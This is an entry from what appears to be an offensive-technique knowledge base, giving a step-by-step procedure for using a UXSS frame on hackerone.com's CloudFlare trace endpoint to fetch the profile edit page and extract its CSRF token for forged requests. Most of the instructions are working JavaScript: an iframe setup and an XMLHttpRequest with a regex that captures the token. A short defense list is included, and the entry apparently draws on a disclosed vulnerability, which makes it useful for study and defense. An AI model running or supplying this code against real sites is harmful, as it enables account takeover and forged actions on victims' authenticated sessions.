---
id: proc-token-extract-001
tags:
  - csrf-token
  - ajax-extraction
  - framing-bypass
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:35.794Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Extract CSRF Token from Framed Resource

## Summary

This procedure uses the established UXSS frame to perform an AJAX request to the HackerOne profile edit page, parsing the HTML response to extract the exposed CSRF token, which is not bound to specific actions.

## Description

Exploiting the lack of X-Frame-Options on CloudFlare's /cdn-cgi/trace endpoint, the malicious page frames it and fetches https://hackerone.com/settings/profile/edit via AJAX. The token is printed directly in the HTML, allowing easy parsing. This works in browsers like IE or Firefox where Origin headers are not sent on form submissions. Outcome: Token available for CSRF forgery.

## Requirements

1. Active UXSS frame from previous step
2. Victim's authenticated session cookies
3. JavaScript environment in the malicious page

## Defense

Defensive measures and detection strategies:

- Bind CSRF tokens to specific actions and origins
- Set X-Frame-Options or CSP frame-ancestors on all resources
- Log and alert on anomalous AJAX fetches to sensitive endpoints

## Objectives

1. Read cross-origin HTML content via UXSS
2. Parse and capture the CSRF token
3. Prepare for forged requests

## Instructions

### Step 1: Frame CloudFlare Endpoint

**Context**: Use the UXSS to frame a resource without anti-framing headers.

In the malicious page script:

```javascript
// Frame the endpoint
iframe.src = 'https://hackerone.com/cdn-cgi/trace';
```

> This succeeds due to missing X-Frame-Options. Expected output: Frame content loads.

### Step 2: AJAX Fetch and Parse Token

**Context**: Request the profile page and extract the token from HTML.

Execute AJAX:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://hackerone.com/settings/profile/edit', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    var html = xhr.responseText;
    var tokenMatch = html.match(/name="csrf_token"\s+value="([^"]+)"/);
    var token = tokenMatch ? tokenMatch[1] : null;
    // Store token for use
  }
};
xhr.send();
```

> Parses the token from the form input. Expected output: Token value like 'abc123def456'.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- token-extraction
- uxss
- cloudflare-bypass
